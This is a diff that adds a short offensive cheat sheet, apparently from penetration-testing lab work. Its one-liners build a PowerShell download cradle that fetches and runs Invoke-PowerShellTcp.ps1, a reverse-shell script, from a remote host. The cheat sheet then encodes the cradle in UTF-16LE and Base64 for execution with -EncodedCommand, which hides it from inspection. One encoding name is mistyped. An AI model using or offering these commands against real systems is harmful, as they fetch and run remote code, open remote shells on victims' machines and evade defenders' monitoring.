@@ -1,0 +1,12 @@
+
+Convert Powershell command to UTF-16LE:
+echo -n "IEX (​New-Object Net.Webclient).downloadstring(​'http://10.10.14.13:6666/Invoke-PowerShellTcp.ps1')" | iconv --to-code UTF-16LE
+
+
+Convert Powershell command to UTF-16LE and Base64:
+echo -n "IEX (​New-Object Net.Webclient).downloadstring(​'http://10.10.14.13:6666/Invoke-PowerShellTcp.ps1')" | iconv --to-code UTF-16L | base64 -w 0
+
+
+
+Run with Powershell -encodedcommand:
+powershell -EncodedCommand <encodedcommand>
